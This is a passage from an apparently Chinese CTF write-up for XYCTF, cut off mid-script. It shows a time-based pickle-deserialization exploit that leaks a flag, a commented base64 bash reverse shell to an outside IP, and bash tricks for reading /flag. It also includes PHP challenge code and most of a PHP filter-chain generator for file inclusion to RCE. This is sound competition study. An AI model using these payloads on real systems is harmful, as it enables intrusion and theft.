class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://localhost:49689/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [ &quot;$(head -n 1 /flag | cut -c 1)&quot; = &quot;q&quot; ] &amp;&amp; sleep 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=if [ `cat /flag | cut -c 1` = &#x27;q&#x27; ];then sleep 5;fi&quot;</span></span><br><span class="line"></span><br><span class="line">alphabet = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;XYCTF&#123;8a49f5c3-7d90-43d5-a94a-d82df2cf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XYCTF&#123;8a49f5c3-7d90-43d5-</span></span><br><span class="line"><span class="comment"># XYCTF&#123;8a49f5c3-7d90-43d5-a94a-d82df2cf27</span></span><br><span class="line"><span class="comment"># XYCTF&#123;8a49f5c3-7d90-43d5-a94a-d82df2cf2fc2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lists = &#x27;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;RememberMe=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;if [ `cat /flag | cut -c &#123;&#125;` = &quot;&#123;&#125;&quot; ];then sleep 30;fi&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">lenth = <span class="built_in">len</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(lenth + <span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> k &gt; <span class="built_in">len</span>(alphabet):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;alphabet too small!!!!&#x27;</span>)</span><br><span class="line">            exit</span><br><span class="line"></span><br><span class="line">        op = opcode.<span class="built_in">format</span>(i, alphabet[k])</span><br><span class="line"></span><br><span class="line">        payload = base64.b64encode(op.encode())</span><br><span class="line">        time1 = time.time()</span><br><span class="line">        headers[<span class="string">&#x27;Cookie&#x27;</span>] = <span class="string">&#x27;RememberMe=&#x27;</span> + payload.decode()</span><br><span class="line">        <span class="built_in">print</span>(opcode.<span class="built_in">format</span>(i,alphabet[k]))</span><br><span class="line">        res = requests.get(url=url, headers=headers)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;waf&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;waf!!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> time.time() - time1 &gt; <span class="number">30</span>:</span><br><span class="line">            flag = flag + alphabet[k]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        k = k + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="εZ-¿м-Kε¿-赛后"><a href="#εZ-¿м-Kε¿-赛后" class="headerlink" title="εZ?¿м@Kε¿?(赛后)"></a>εZ?¿м@Kε¿?(赛后)</h2><p>第一反应是构造一个文件写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;$@&lt;$&lt;</span><br></pre></td></tr></table></figure><p>这里可以创建一个FLAG文件在当前目录, 但并不能如我所愿把&#x2F;flag里的内容重定向进去</p><p>看了wp, 这里把&#x2F;flag传给bash, bash读取内容, 尝试把内容当成命令执行, 但是这个命令是不存在的, 显示报错, 把flag带出来, 这与之前见过的nmap oG参数写shell有异曲同工之妙, 可惜当时没想到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$(&lt;$&lt;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240427133820719.png" alt="image-20240427133820719"></p><h2 id="连连看到底是连连什么看-赛后"><a href="#连连看到底是连连什么看-赛后" class="headerlink" title="连连看到底是连连什么看(赛后)"></a>连连看到底是连连什么看(赛后)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题的trick在很久之前就看过, 利用各种php过滤器,无需零时文件包含shell</p><p><a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p>这里就比较抽象, 没找到很好的脚本, 一开始思路就是多几次base64解码来把XYCTF后面的乱码忽略, 奈何一直不成功就放弃了</p><p>贴一下不错的脚本</p><p>php_filter_chain_generator.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># - Useful infos -</span></span><br><span class="line"><span class="comment"># https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</span></span><br><span class="line"><span class="comment"># https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</span></span><br><span class="line"><span class="comment"># https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No need to guess a valid filename anymore</span></span><br><span class="line">file_to_use = <span class="string">&quot;php://temp&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;M&#x27;</span>:<span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span>:<span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Q&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;+&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_filter_chain</span>(<span class="params">chain, debug_base64 = <span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    encoded_chain = chain</span><br><span class="line">    <span class="comment"># generate some garbage base64</span></span><br><span class="line">    filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">    filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">    <span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">    filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> encoded_chain[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug_base64:</span><br><span class="line">        <span class="comment"># 